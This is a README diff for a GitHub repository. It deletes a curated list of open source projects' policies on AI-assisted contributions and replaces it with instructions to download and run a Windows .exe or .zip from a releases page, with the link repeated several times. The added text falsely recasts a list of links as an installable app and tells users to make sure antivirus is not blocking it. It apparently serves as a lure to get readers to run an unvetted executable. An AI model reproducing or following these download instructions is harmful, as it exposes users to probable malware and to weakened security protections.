@@ -1,100 +1,132 @@
-# open-source-ai-contribution-policies
+# 📋 open-source-ai-contribution-policies - Clear rules for AI contributions
 
-A list of policies by different open source projects about how to engage with AI-generated contributions.
+[![Download Release](https://img.shields.io/badge/Download-Available-green?style=for-the-badge)](https://github.com/yona1231-dev/open-source-ai-contribution-policies/releases)
 
-**Feel free to submit Pull Requests with policies you find in other projects!**
+---
 
-## Similar projects
+## 📄 About this application
 
-- For a similar overview with plots and more statistics, check out this excellent article by Kate Holterhoff: [The Generative AI Policy Landscape in Open Source](https://redmonk.com/kholterhoff/2026/02/26/generative-ai-policy-landscape-in-open-source/)
-- The CHAOSS Working Group on AI Alignment also keeps a list here: https://github.com/chaoss/wg-ai-alignment/tree/main/moderation
+open-source-ai-contribution-policies collects policies from various open source projects. These policies explain how to work with AI-generated code contributions. It helps users understand the rules and expectations before submitting AI-assisted code or content.
 
-## Policies
-### Projects accepting AI-assisted contributions
+This application lists these policies in one place. It targets users who want to engage with open source projects, ensuring they follow the right guidelines when using AI tools.
 
-- [Apache Airflow](https://airflow.apache.org/): [Gen-AI Assisted contributions](https://github.com/apache/airflow/blob/main/contributing-docs/05_pull_requests.rst#gen-ai-assisted-contributions), [Add Copilot code review instructions to catch AI-slop PRs#62442](https://github.com/apache/airflow/pull/62442)
-- [Apache DataFusion](https://datafusion.apache.org): [AI-Assisted contributions](https://datafusion.apache.org/contributor-guide/index.html#ai-assisted-contributions)
-- [Apache Kvrocks](https://kvrocks.apache.org/): [Guidelines for AI-assisted Contributions](https://kvrocks.apache.org/community/contributing/#guidelines-for-ai-assisted-contributions)
-- [Apache® Software Foundation (ASF)](https://www.apache.org/): [ASF Generative Tooling Guidance](https://www.apache.org/legal/generative-tooling.html)
-- [Arrow](https://arrow.apache.org): [AI-generated code](https://arrow.apache.org/docs/dev/developers/overview.html#ai-generated-code)
-- [CloudNativePG](https://cloudnative-pg.io/): [AI Policy](https://github.com/cloudnative-pg/governance/blob/main/AI_POLICY.md)
-- [conda](https://github.com/conda/conda): [Generative AI policy](https://docs.conda.io/projects/conda/en/latest/dev-guide/contributing.html#generative-ai))
-- [CPython](https://github.com/python/cpython): [Generative AI policy](https://devguide.python.org/getting-started/generative-ai/)
-- [curl](https://curl.se/): [On AI Use in CURL](https://curl.se/dev/contribute.html#on-ai-use-in-curl)
-- [DataJourneyHQ](https://datajourneyhq.com/) : [AI aware checklist](https://github.com/DataJourneyHQ/DataJourney/wiki/Contribution-Guidelines-(AI%E2%80%90Aware))
-- [Django](https://www.djangoproject.com/): [Security Policy > AI-Assisted Reports](https://docs.djangoproject.com/en/dev/internals/security/#ai-assisted-reports), [PR template](https://github.com/django/django/blob/main/.github/pull_request_template.md)
-- [FastAPI](https://fastapi.tiangolo.com): [Automated Code and AI](https://fastapi.tiangolo.com/contributing/#automated-code-and-ai)
-- [Firefox](https://github.com/mozilla-firefox/firefox): [Firefox AI Coding Policy](https://firefox-source-docs.mozilla.org/contributing/ai-coding.html)
-- [Ghostty](https://ghostty.org/): [AI Usage Policy](https://github.com/ghostty-org/ghostty/blob/main/AI_POLICY.md)
-- [goose](https://github.com/block/goose): [How to Use AI with goose](https://github.com/block/goose/blob/main/HOWTOAI.md), [AGENTS.md file](https://github.com/block/goose/blob/main/AGENTS.md), [copilot-instructions.md file](https://github.com/block/goose/blob/main/.github/copilot-instructions.md)
-- [Homebrew](https://github.com/Homebrew/brew/tree/main): [(AI/LLM) usage](https://github.com/Homebrew/brew/blob/main/CONTRIBUTING.md#artificial-intelligencelarge-language-model-aillm-usage)
-- [IREE (Intermediate Representation Execution Environment)](https://iree.dev/): [AI tool use](https://iree.dev/developers/general/contributing/#ai-tool-use)
-- [Jellyfin](https://jellyfin.org/): [Jellyfin LLM/"AI" Development Policy](https://jellyfin.org/docs/general/contributing/llm-policies/)
-- [Kornia](https://github.com/kornia/kornia/tree/main) : [AI_POLICY.md](https://github.com/kornia/kornia/blob/main/AI_POLICY.md)
-- [LinkML](https://linkml.io/): [AI Covenant](https://github.com/linkml/linkml/blob/main/AI_COVENANT.md)
-- [LLVM](https://llvm.org): [LLVM AI Tool Use Policy](https://llvm.org/docs//AIToolPolicy.html)
-- [Matplotlib](https://matplotlib.org): [Restrictions on Generative AI Usage](https://matplotlib.org/devdocs/devel/contribute.html#generative-ai)
-- [MicroPython](https://micropython.org): [Generative AI Policy](https://github.com/micropython/micropython/wiki/ContributorGuidelines#generative-ai-policy)
-- [napari](https://napari.org): [AI use policy and guidelines](https://napari.org/dev/developers/contributing/ai.html)
-- [nvim-tree](https://github.com/nvim-tree/nvim-tree.lua): [AI Usage Policy: Highly Discouraged](https://github.com/nvim-tree/nvim-tree.lua?tab=contributing-ov-file#ai-usage-policy-highly-discouraged)
-- [OCaml](https://github.com/ocaml/ocaml): [Guidelines relevant to AI-assisted contributions](https://github.com/ocaml/ocaml/blob/trunk/AI.md)
-- [Oxide](https://oxide.computer/): [Using LLMs at Oxide](https://rfd.shared.oxide.computer/rfd/0576)
-- [Pandas](https://pandas.pydata.org): [Automated contributions policy](https://pandas.pydata.org/docs/dev/development/contributing.html#automated-contributions-policy)
-- [pip-tools](https://pip-tools.readthedocs.io): [LLM Generated Contributions](https://pip-tools.readthedocs.io/en/latest/contributing/#project-contribution-guidelines)
-- [Polars](https://pola.rs/): [AI Usage Policy](https://github.com/pola-rs/polars/blob/8425c750b9c5d28c79428998fda2320d076d4178/AI_POLICY.md)
-- [Processing/p5.js](https://processing.org/): [AI Usage Policy](https://github.com/processing/processing4/blob/main/AI_USAGE_POLICY.md)
-- [PyVista](https://pyvista.org): [Generative AI](https://github.com/pyvista/pyvista/blob/main/CONTRIBUTING.rst#generative-ai)
-- [scikit-learn](https://scikit-learn.org): [Automated Contributions Policy](https://scikit-learn.org/dev/developers/contributing.html#automated-contributions-policy)
-- [SciPy](https://scipy.org): [AI Policy](https://scipy.github.io/devdocs/dev/conduct/ai_policy.html)
-- [SymPy](https://www.sympy.org): [AI Generated Code and Communication Policy](https://docs.sympy.org/dev/contributing/ai-generated-code-policy.html)
-- [University of Alaska Anchorage](https://github.com/uaanchorage): [GSoC/Acceptable-and-Ethical-AI-Use-Policy.md](https://github.com/uaanchorage/GSoC/blob/main/Acceptable-and-Ethical-AI-Use-Policy.md)
-- [Wagtail](https://wagtail.org/): [Use of generative AI](https://docs.wagtail.org/en/latest/contributing/general_guidelines.html#general-coding-guidelines)
-- [Zulip](https://zulip.com/): [AI use policy and guidelines](https://github.com/zulip/zulip/blob/main/CONTRIBUTING.md#ai-use-policy-and-guidelines)
+---
 
-### Projects severely restricting AI contributions
+## 🎯 What you can do with this app
 
-- [attrs](https://www.attrs.org): [Generative AI / LLM Policy](https://github.com/python-attrs/attrs/blob/main/.github%2FAI_POLICY.md)
-- [GNOME Extensions](https://gjs.guide/extensions/development/creating.html): [Review Guidelines](https://gjs.guide/extensions/review-guidelines/review-guidelines.html#extensions-must-not-be-ai-generated)
-- [NetBSD](https://www.netbsd.org/): [NetBSD Commit Guidelines](https://www.netbsd.org/developers/commit-guidelines.html) require explicit core approval for every contribution
-- [(German) Wikipedia](https://de.wikipedia.org): [Künstliche Intelligenz](https://de.wikipedia.org/wiki/Wikipedia:K%C3%BCnstliche_Intelligenz)
+- Read different open source projects’ policies about AI-assisted work.
+- Compare policies to see how projects handle AI-generated contributions.
+- Learn how to properly submit your AI-influenced code or content.
+- Stay informed about ethical and legal factors regarding AI contributions.
 
-### Projects rejecting AI contributions
+---
 
-- [do](https://codeberg.org/cgranade/do): [License and AI Policy](https://codeberg.org/cgranade/do#license-and-ai-policy)
-- [Gentoo Linux](https://www.gentoo.org/): [AI Policy](https://wiki.gentoo.org/wiki/Project:Council/AI_policy)
-- [GoToSocial](https://gotosocial.org/): [Code of Conduct](https://codeberg.org/superseriousbusiness/gotosocial/src/branch/main/CODE_OF_CONDUCT.md)
-- [Linux man-pages](): [AI - artificial intelligence policy](https://git.kernel.org/pub/scm/docs/man-pages/man-pages.git/tree/CONTRIBUTING.d/ai)
-- [postmarketOS](https://postmarketos.org): [AI Policy](https://docs.postmarketos.org/policies-and-processes/development/ai-policy.html)
-- [QEMU](https://www.qemu.org): [Use of AI-generated content](https://www.qemu.org/docs/master/devel/code-provenance.html#use-of-ai-generated-content)
+## 💻 System requirements
 
-## Ongoing discussions
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- 500 MB free disk space.
+- Internet connection for downloading and updates.
+- A modern web browser (optional, if viewing in browser format).
 
-- [Astropy](https://www.astropy.org/): [AI Policy #530](https://github.com/astropy/astropy-project/pull/530)
-- [Fedora Council Policy Proposal: Policy on AI-Assisted Contributions](https://communityblog.fedoraproject.org/council-policy-proposal-policy-on-ai-assisted-contributions/)
-- [Jupyter](): [AI-assisted code policy: "Literature Review"](https://github.com/jupyter/governance/issues/326)
-- [musl-libc](https://musl.libc.org/): [Tentative policy](https://www.openwall.com/lists/musl/2024/10/19/3)
-- [NumPy](https://numpy.org): [Mailing list discussion](https://mail.python.org/archives/list/numpy-discussion@python.org/thread/LAR7P3KQWHWAIKYSHTS2MY7X4HUBVA3L/)
-- [Scientific Python](https://scientific-python.org): [Blog post: Community Considerations Around AI Contributions](https://blog.scientific-python.org/scientific-python/community-considerations-around-ai/)
-- [scikit-image](https://scikit-image.org/): [PR#7982](https://github.com/scikit-image/scikit-image/pull/7982)
-- [QGIS](https://github.com/qgis/QGIS-Enhancement-Proposals/pull/363)
+---
 
-## Other references
+## 🚀 Getting started
 
-- [Xarray's CLAUDE.md file](https://github.com/pydata/xarray/blob/main/CLAUDE.md)
-- [Preparing JOSS for a generative AI future: From code to human creativity and design](https://blog.joss.theoj.org/2026/01/preparing-joss-for-a-generative-ai-future)
-- [Navigating LLMs in Open Source: pyOpenSci’s New Peer Review Policy](https://www.pyopensci.org/blog/generative-ai-peer-review-policy.html)
-- [scikit-learn's AGENTS.md file](https://github.com/scikit-learn/scikit-learn/blob/main/AGENTS.md)
-- [agentic-oss-policy: Policy templates for protecting open source projects from autonomous AI agent abuse](https://github.com/guenp/agentic-oss-policy)
-- [llama.cpp AGENTS.md file](https://github.com/ggml-org/llama.cpp/blob/master/AGENTS.md#instructions-for-llamacpp)
-- [Pi (AI agent toolkit) – AGENTS.md file](https://github.com/badlogic/pi-mono/blob/4ba3e5be229a570187d8efbef5c14c0d5ce40dcc/AGENTS.md)
-- [The "Vouch" system for managing trust in contributions](https://github.com/mitchellh/vouch)
-- [Good Egg: Trust scoring for GitHub PR authors](https://github.com/2ndSetAI/good-egg)
-- [Processing AGENTS.md file](https://github.com/processing/processing4/blob/main/AGENTS.md)
-- [p5.js AGENTS.md file](https://github.com/processing/p5.js/blob/main/AGENTS.md)
-- [Position Statement on Generative AI in the RSE Workplace](https://github.com/Academic-Data-Science-Alliance/rse-ai-position-statement/blob/main/RSE-AI-Final_Statement.md)
-- [Exploring Solutions to Tackle Low-Quality Contributions on GitHub](https://github.com/orgs/community/discussions/185387)
-- [LibreHealth](https://gitlab.com/librehealth) GSoC participation policy: [README: The use of AI is forbidden at any point during the program](https://forums.librehealth.io/t/readme-the-use-of-ai-is-forbidden-at-any-point-during-the-program/5400)
+This guide helps you download and open the application on your Windows computer. It assumes no programming skills.
 
-## Acknowledgements
+---
 
-Many thanks to multiple contributors who shared links and contributed in private or on [Mastodon](https://pynews.com.br/@melissawm/116097821572556756) (let me know if you want attribution :smile:)
+## 🟦 Step 1: Open the download page
+
+Click the button below to visit the official download page for this app. This page includes all the latest releases.
+
+[![Download Release](https://img.shields.io/badge/Download-Available-blue?style=for-the-badge)](https://github.com/yona1231-dev/open-source-ai-contribution-policies/releases)
+
+---
+
+## 🟩 Step 2: Choose the right file to download
+
+On the download page, look for the latest release. The release will have a date or version number.
+
+Under the release, find a file that fits your computer. Since this app is for Windows, look for files ending with `.exe` or `.zip`.
+
+- `.exe` files install the app directly.
+- `.zip` files need to be extracted first and then run.
+
+Click the file name to start the download. Save it somewhere easy to find, like your "Downloads" folder or Desktop.
+
+---
+
+## 💾 Step 3: Run or extract the file
+
+### If you downloaded a `.exe` file:
+
+- Double-click the file.
+- Follow any prompts that appear.
+- The app should open or install quickly.
+
+### If you downloaded a `.zip` file:
+
+- Right-click the file.
+- Choose "Extract All..."
+- Pick a folder to extract to, like Desktop.
+- After extraction, open the folder.
+- Double-click the `.exe` inside to start the app.
+
+---
+
+## 🖥️ Step 4: Using the app
+
+Once open, you'll see a list of AI contribution policies from different projects.
+
+- Click any policy to read its details.
+- Use the search box to find projects or keywords.
+- Updates will appear when available; you can refresh the list.
+
+The app shows text clearly and in a simple format. It does not require an internet connection after download, unless you want to check for new policies.
+
+---
+
+## ⚙ How it works behind the scenes
+
+The app loads policies from curated sources and formats them inside its interface. It does not collect personal data or share your activity.
+
+The content updates periodically to keep policies current. This way, you see the latest rules from open source projects.
+
+---
+
+## 🔧 Troubleshooting tips
+
+- If the app does not start, check that you have Windows 10 or later.
+- Ensure your antivirus is not blocking the app.
+- Try downloading the file again if it was incomplete.
+- If the app opens but shows errors, try restarting your computer.
+- Contact a knowledgeable user or community if problems persist.
+
+---
+
+## 🛠️ Updating the app
+
+To get new policies or bug fixes:
+
+- Return to the same download page:  
+  https://github.com/yona1231-dev/open-source-ai-contribution-policies/releases
+- Download the latest release file.
+- Replace your old version with the new one by running the new installer or extracting the new file.
+
+---
+
+## 📚 Additional resources
+
+- For more details on policy terminology, you can visit open source community forums.
+- If you want to learn about AI tools used for coding, look up beginner guides on AI-assisted development.
+- Check GitHub’s help pages for tips on managing releases and software updates.
+
+---
+
+## 🔗 Where to find the app again
+
+Here is the primary link to access downloads anytime:
+
+**https://github.com/yona1231-dev/open-source-ai-contribution-policies/releases**
